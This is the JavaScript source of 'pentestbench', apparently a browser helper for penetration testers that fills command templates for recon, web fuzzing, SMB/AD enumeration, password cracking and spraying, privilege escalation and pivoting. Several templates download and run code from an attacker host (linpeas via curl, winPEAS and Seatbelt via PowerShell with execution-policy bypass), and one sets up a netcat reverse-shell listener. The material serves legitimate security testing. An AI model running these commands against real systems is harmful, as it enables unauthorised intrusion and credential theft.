const STORE = {
  values: "pentestbench_values_v2",
  notes: "pentestbench_notes_v1",
  recipes: "pentestbench_recipes_v1"
};

const els = {
  tabs: Array.from(document.querySelectorAll(".tab")),
  views: {
    commands: document.getElementById("view-commands"),
    notes: document.getElementById("view-notes"),
    cheatsheet: document.getElementById("view-cheatsheet")
  },

  ip: document.getElementById("ip"),
  port: document.getElementById("port"),
  url: document.getElementById("url"),
  domain: document.getElementById("domain"),
  user: document.getElementById("user"),
  pass: document.getElementById("pass"),
  wordlist: document.getElementById("wordlist"),
  hashfile: document.getElementById("hashfile"),
  lhost: document.getElementById("lhost"),
  lport: document.getElementById("lport"),
  iface: document.getElementById("iface"),
  proxy: document.getElementById("proxy"),

  cmdSearch: document.getElementById("cmdSearch"),
  btnClearSearch: document.getElementById("btnClearSearch"),
  commandsContainer: document.getElementById("commandsContainer"),

  btnExpandAll: document.getElementById("btnExpandAll"),
  btnResetAll: document.getElementById("btnResetAll"),
  btnCopyAll: document.getElementById("btnCopyAll"),

  btnExportSession: document.getElementById("btnExportSession"),
  btnImportSession: document.getElementById("btnImportSession"),
  btnExportRecipes: document.getElementById("btnExportRecipes"),
  btnImportRecipes: document.getElementById("btnImportRecipes"),

  filePicker: document.getElementById("filePicker"),

  notes: document.getElementById("notes"),
  btnNotesClear: document.getElementById("btnNotesClear"),
  btnNotesExport: document.getElementById("btnNotesExport"),

  cheatBlock: document.getElementById("cheatBlock"),
  btnCheatCopy: document.getElementById("btnCheatCopy"),

  toast: document.getElementById("toast")
};

function loadJSON(key, fallback) {
  try {
    const raw = localStorage.getItem(key);
    return raw ? JSON.parse(raw) : fallback;
  } catch {
    return fallback;
  }
}
function saveJSON(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

function getValues() {
  const v = {
    ip: els.ip.value.trim(),
    port: els.port.value.trim(),
    url: els.url.value.trim(),
    domain: els.domain.value.trim(),
    user: els.user.value.trim(),
    pass: els.pass.value.trim(),
    wordlist: els.wordlist.value.trim(),
    hashfile: els.hashfile.value.trim(),
    lhost: els.lhost.value.trim(),
    lport: els.lport.value.trim(),
    iface: els.iface.value.trim(),
    proxy: els.proxy.value.trim()
  };

  // ConveniÃªncias
  if (!v.url && v.ip) {
    const p = v.port ? `:${v.port}` : "";
    v.url = `http://${v.ip}${p}`;
  }
  v.rhost = v.ip;
  v.rport = v.port;

  // base URL sem path
  try {
    const u = new URL(v.url);
    v.base = `${u.protocol}//${u.host}`;
  } catch {
    v.base = v.url || "";
  }

  return v;
}

function applyValues(v) {
  els.ip.value = v.ip ?? "";
  els.port.value = v.port ?? "";
  els.url.value = v.url ?? "";
  els.domain.value = v.domain ?? "";
  els.user.value = v.user ?? "";
  els.pass.value = v.pass ?? "";
  els.wordlist.value = v.wordlist ?? "";
  els.hashfile.value = v.hashfile ?? "";
  els.lhost.value = v.lhost ?? "";
  els.lport.value = v.lport ?? "";
  els.iface.value = v.iface ?? "";
  els.proxy.value = v.proxy ?? "";
}

function renderCmd(template, values) {
  return template.replace(/\{(\w+)\}/g, (_, k) => values[k] ?? "");
}

function toast(msg) {
  els.toast.textContent = msg;
  els.toast.classList.add("show");
  window.clearTimeout(toast._t);
  toast._t = window.setTimeout(() => els.toast.classList.remove("show"), 1150);
}

async function copy(text) {
  try {
    await navigator.clipboard.writeText(text);
    toast("Copiado.");
    return true;
  } catch {
    toast("Falha ao copiar.");
    return false;
  }
}

function downloadJSON(filename, obj) {
  const data = JSON.stringify(obj, null, 2);
  const blob = new Blob([data], { type: "application/json;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}

function pickJSONFile(cb) {
  els.filePicker.value = "";
  els.filePicker.onchange = async () => {
    const f = els.filePicker.files && els.filePicker.files[0];
    if (!f) return;
    try {
      const txt = await f.text();
      const obj = JSON.parse(txt);
      cb(obj);
    } catch {
      toast("JSON invÃ¡lido.");
    }
  };
  els.filePicker.click();
}

const DEFAULT_RECIPES = [
  {
    category: "Recon",
    icon: "ðŸ§­",
    items: [
      { name: "Nmap full TCP", tag: "nmap", cmd: "nmap -p- -T4 {rhost}" },
      { name: "Nmap service scan", tag: "nmap", cmd: "nmap -sC -sV -p {rport} {rhost}" },
      { name: "Nmap UDP top", tag: "nmap", cmd: "sudo nmap -sU --top-ports 200 {rhost}" },
      { name: "Rustscan + nmap", tag: "rustscan", cmd: "rustscan -a {rhost} -- -sC -sV" },
      { name: "HTTP headers", tag: "web", cmd: "curl -skI {base} | head -n 30" }
    ]
  },
  {
    category: "Web",
    icon: "ðŸŒ",
    items: [
      { name: "Gobuster dir", tag: "content", cmd: "gobuster dir -u {base}/ -w {wordlist} -t 50 -x php,asp,aspx,jsp,txt" },
      { name: "FFUF dir", tag: "fuzz", cmd: "ffuf -u {base}/FUZZ -w {wordlist} -t 80 -fs 0" },
      { name: "FFUF vhost", tag: "vhost", cmd: "ffuf -u {base}/ -H \"Host: FUZZ.{domain}\" -w {wordlist} -t 80 -fs 0" },
      { name: "Nikto", tag: "scan", cmd: "nikto -h {base}/" },
      { name: "Nuclei", tag: "scan", cmd: "nuclei -u {base}/ -severity low,medium,high,critical" },
      { name: "Proxy curl", tag: "proxy", cmd: "curl -x {proxy} -sk {base}/" }
    ]
  },
  {
    category: "SMB",
    icon: "ðŸ§±",
    items: [
      { name: "smbclient list shares", tag: "smb", cmd: "smbclient -L //{rhost}/ -N" },
      { name: "smbmap guest", tag: "smbmap", cmd: "smbmap -H {rhost} -u \"\" -p \"\"" },
      { name: "crackmapexec smb", tag: "cme", cmd: "crackmapexec smb {rhost} -u \"{user}\" -p \"{pass}\"" },
      { name: "cme local auth spray", tag: "cme", cmd: "crackmapexec smb {rhost} -u users.txt -p {wordlist} --continue-on-success" }
    ]
  },
  {
    category: "AD Enumeration",
    icon: "ðŸ§ ",
    items: [
      { name: "BloodHound python", tag: "ad", cmd: "bloodhound-python -u \"{user}\" -p \"{pass}\" -d \"{domain}\" -ns {rhost} -c all" },
      { name: "ldapdomaindump", tag: "ldap", cmd: "ldapdomaindump -u \"{domain}\\\\{user}\" -p \"{pass}\" ldap://{rhost}" },
      { name: "kerbrute userenum", tag: "kerbrute", cmd: "kerbrute userenum --dc {rhost} -d {domain} {wordlist}" },
      { name: "GetNPUsers", tag: "impacket", cmd: "GetNPUsers.py {domain}/ -dc-ip {rhost} -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt" }
    ]
  },
  {
    category: "Creds",
    icon: "ðŸ”",
    items: [
      { name: "Hydra SSH", tag: "hydra", cmd: "hydra -l \"{user}\" -P \"{wordlist}\" ssh://{rhost} -t 4" },
      { name: "John crack", tag: "john", cmd: "john --wordlist=\"{wordlist}\" \"{hashfile}\"" },
      { name: "Hashcat MD5", tag: "hashcat", cmd: "hashcat -m 0 -a 0 \"{hashfile}\" \"{wordlist}\" --force" },
      { name: "Hashcat NTLM", tag: "hashcat", cmd: "hashcat -m 1000 -a 0 \"{hashfile}\" \"{wordlist}\" --force" }
    ]
  },
  {
    category: "PrivEsc Linux",
    icon: "ðŸ§",
    items: [
      { name: "LinPEAS download", tag: "enum", cmd: "curl -L http://{lhost}:{lport}/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh" },
      { name: "SUID list", tag: "enum", cmd: "find / -perm -4000 -type f 2>/dev/null" },
      { name: "sudo -l", tag: "enum", cmd: "sudo -l" },
      { name: "capabilities", tag: "enum", cmd: "getcap -r / 2>/dev/null" }
    ]
  },
  {
    category: "PrivEsc Windows",
    icon: "ðŸªŸ",
    items: [
      { name: "whoami /all", tag: "enum", cmd: "whoami /all" },
      { name: "systeminfo", tag: "enum", cmd: "systeminfo" },
      { name: "winPEAS", tag: "enum", cmd: "powershell -ep bypass -c \"iwr http://{lhost}:{lport}/winpeas.exe -outfile $env:TEMP\\\\winpeas.exe; & $env:TEMP\\\\winpeas.exe\"" },
      { name: "Seatbelt", tag: "enum", cmd: "powershell -ep bypass -c \"iwr http://{lhost}:{lport}/Seatbelt.exe -outfile $env:TEMP\\\\Seatbelt.exe; & $env:TEMP\\\\Seatbelt.exe all\"" }
    ]
  },
  {
    category: "Transfer",
    icon: "ðŸ“¦",
    items: [
      { name: "HTTP server", tag: "serve", cmd: "python3 -m http.server {lport}" },
      { name: "curl download", tag: "dl", cmd: "curl -L http://{lhost}:{lport}/FILE -o /tmp/FILE" },
      { name: "wget download", tag: "dl", cmd: "wget http://{lhost}:{lport}/FILE -O /tmp/FILE" }
    ]
  },
  {
    category: "Pivoting",
    icon: "ðŸ§·",
    items: [
      { name: "SSH local forward", tag: "ssh", cmd: "ssh -L 127.0.0.1:8888:{rhost}:{rport} {user}@{rhost}" },
      { name: "SSH dynamic socks", tag: "ssh", cmd: "ssh -D 127.0.0.1:1080 {user}@{rhost}" },
      { name: "Chisel server", tag: "chisel", cmd: "chisel server -p 8000 --reverse" },
      { name: "Chisel client socks", tag: "chisel", cmd: "chisel client {rhost}:8000 R:socks" },
      { name: "Proxychains", tag: "proxy", cmd: "proxychains -q nmap -sT -Pn -p {rport} {rhost}" }
    ]
  }
];

function validateRecipes(obj) {
  if (!obj || !Array.isArray(obj)) return false;
  for (const g of obj) {
    if (!g.category || !Array.isArray(g.items)) return false;
    for (const it of g.items) {
      if (!it.name || !it.cmd) return false;
    }
  }
  return true;
}

let recipes = loadJSON(STORE.recipes, null);
if (!validateRecipes(recipes)) recipes = DEFAULT_RECIPES;

function sectionEl(group, values, query) {
  const section = document.createElement("div");
  section.className = "section";
  section.dataset.open = "false";

  const head = document.createElement("div");
  head.className = "sectionHead";

  const left = document.createElement("div");
  left.className = "sectionTitle";
  left.innerHTML = `<span>${group.icon ?? "ðŸ“Œ"}</span><span>${group.category}</span>`;

  const badge = document.createElement("span");
  badge.className = "badge";

  const chev = document.createElement("span");
  chev.className = "chev";
  chev.textContent = "â–¾";

  head.appendChild(left);
  head.appendChild(badge);
  head.appendChild(chev);

  const body = document.createElement("div");
  body.className = "sectionBody";

  const items = (group.items || [])
    .map(it => {
      const cmd = renderCmd(it.cmd, values);
      return { ...it, cmd };
    })
    .filter(it => {
      if (!query) return true;
      const q = query.toLowerCase();
      const hay = [
        it.name,
        it.tag || "",
        it.cmd,
        group.category || ""
      ].join(" ").toLowerCase();
      return hay.includes(q);
    });

  badge.textContent = `${items.length} commands`;

  if (items.length === 0) {
    section.dataset.open = "false";
    body.style.display = "none";
  } else {
    for (const it of items) {
      const item = document.createElement("div");
      item.className = "item";

      const top = document.createElement("div");
      top.className = "itemTop";

      const name = document.createElement("div");
      name.className = "itemName";
      name.textContent = it.name;

      if (it.tag) {
        const tag = document.createElement("span");
        tag.className = "tag";
        tag.textContent = it.tag;
        name.appendChild(tag);
      }

      const btn = document.createElement("button");
      btn.className = "btn";
      btn.textContent = "Copy";
      btn.addEventListener("click", () => copy(it.cmd));

      top.appendChild(name);
      top.appendChild(btn);

      const pre = document.createElement("pre");
      pre.className = "code";
      pre.textContent = it.cmd;

      item.appendChild(top);
      item.appendChild(pre);
      body.appendChild(item);
    }
  }

  head.addEventListener("click", () => {
    const isOpen = section.dataset.open === "true";
    section.dataset.open = (!isOpen).toString();
    body.style.display = isOpen ? "none" : "grid";
  });

  section.appendChild(head);
  section.appendChild(body);
  return section;
}

function renderCommands() {
  const values = getValues();
  saveJSON(STORE.values, values);

  const q = (els.cmdSearch.value || "").trim();
  els.commandsContainer.innerHTML = "";

  for (const group of recipes) {
    els.commandsContainer.appendChild(sectionEl(group, values, q));
  }

  if (q) {
    const sections = Array.from(els.commandsContainer.querySelectorAll(".section"));
    for (const sec of sections) {
      const hasItems = sec.querySelectorAll(".item").length > 0;
      const body = sec.querySelector(".sectionBody");
      sec.dataset.open = hasItems ? "true" : "false";
      body.style.display = hasItems ? "grid" : "none";
    }
  }
}

function expandAll(open) {
  const sections = Array.from(document.querySelectorAll(".section"));
  for (const sec of sections) {
    const body = sec.querySelector(".sectionBody");
    sec.dataset.open = open ? "true" : "false";
    body.style.display = open ? "grid" : "none";
  }
}

function setTab(tab) {
  els.tabs.forEach(b => {
    const active = b.dataset.tab === tab;
    b.classList.toggle("active", active);
    b.setAttribute("aria-selected", active ? "true" : "false");
  });
  Object.entries(els.views).forEach(([k, v]) => v.classList.toggle("active", k === tab));
}

function renderCheatsheet() {
  const v = getValues();
  const block = [
    "# Quick recon",
    "nmap -p- -T4 {rhost}",
    "nmap -sC -sV -p {rport} {rhost}",
    "",
    "# Web quick",
    "ffuf -u {base}/FUZZ -w {wordlist} -t 80 -fs 0",
    "",
    "# Listener",
    "rlwrap nc -lvnp {lport}",
    "",
    "# Serve files",
    "python3 -m http.server {lport}",
    ""
  ].map(line => renderCmd(line, v)).join("\n");

  els.cheatBlock.textContent = block;
}

function resetAll() {
  applyValues({
    ip: "", port: "", url: "", domain: "", user: "", pass: "",
    wordlist: "", hashfile: "", lhost: "", lport: "", iface: "", proxy: ""
  });
  saveJSON(STORE.values, getValues());
  renderCommands();
  renderCheatsheet();
  toast("Resetado.");
}

function bind() {
  els.tabs.forEach(b => b.addEventListener("click", () => setTab(b.dataset.tab)));

  [
    els.ip, els.port, els.url, els.domain, els.user, els.pass, els.wordlist,
    els.hashfile, els.lhost, els.lport, els.iface, els.proxy
  ].forEach(el => el.addEventListener("input", () => {
    renderCommands();
    renderCheatsheet();
  }));

  els.cmdSearch.addEventListener("input", renderCommands);
  els.btnClearSearch.addEventListener("click", () => {
    els.cmdSearch.value = "";
    renderCommands();
  });

  els.btnResetAll.addEventListener("click", resetAll);

  els.btnExpandAll.addEventListener("click", () => {
    const sections = Array.from(document.querySelectorAll(".section"));
    const anyClosed = sections.some(s => s.dataset.open !== "true");
    expandAll(anyClosed);
  });

  els.btnCopyAll.addEventListener("click", async () => {
    const v = getValues();
    const lines = [];
    for (const g of recipes) {
      lines.push(`## ${g.category}`);
      for (const it of g.items) lines.push(renderCmd(it.cmd, v));
      lines.push("");
    }
    await copy(lines.join("\n"));
  });

  els.notes.addEventListener("input", () => localStorage.setItem(STORE.notes, els.notes.value));
  els.btnNotesClear.addEventListener("click", () => {
    els.notes.value = "";
    localStorage.setItem(STORE.notes, "");
    toast("Notas limpas.");
  });
  els.btnNotesExport.addEventListener("click", () => {
    const data = els.notes.value || "";
    const blob = new Blob([data], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "pentestbench_notes.txt";
    a.click();
    URL.revokeObjectURL(url);
    toast("Exportado.");
  });

  els.btnCheatCopy.addEventListener("click", () => copy(els.cheatBlock.textContent));

  els.btnExportSession.addEventListener("click", () => {
    const v = getValues();
    downloadJSON("pentestbench_session.json", v);
    toast("SessÃ£o exportada.");
  });

  els.btnImportSession.addEventListener("click", () => {
    pickJSONFile(obj => {
      applyValues(obj || {});
      saveJSON(STORE.values, getValues());
      renderCommands();
      renderCheatsheet();
      toast("SessÃ£o importada.");
    });
  });

  els.btnExportRecipes.addEventListener("click", () => {
    downloadJSON("pentestbench_recipes.json", recipes);
    toast("Receitas exportadas.");
  });

  els.btnImportRecipes.addEventListener("click", () => {
    pickJSONFile(obj => {
      if (!validateRecipes(obj)) {
        toast("Receitas invÃ¡lidas.");
        return;
      }
      recipes = obj;
      saveJSON(STORE.recipes, recipes);
      renderCommands();
      toast("Receitas importadas.");
    });
  });
}

(function init() {
  applyValues(loadJSON(STORE.values, {}));
  els.notes.value = localStorage.getItem(STORE.notes) || "";

  bind();
  renderCommands();
  renderCheatsheet();
  setTab("commands");
})();
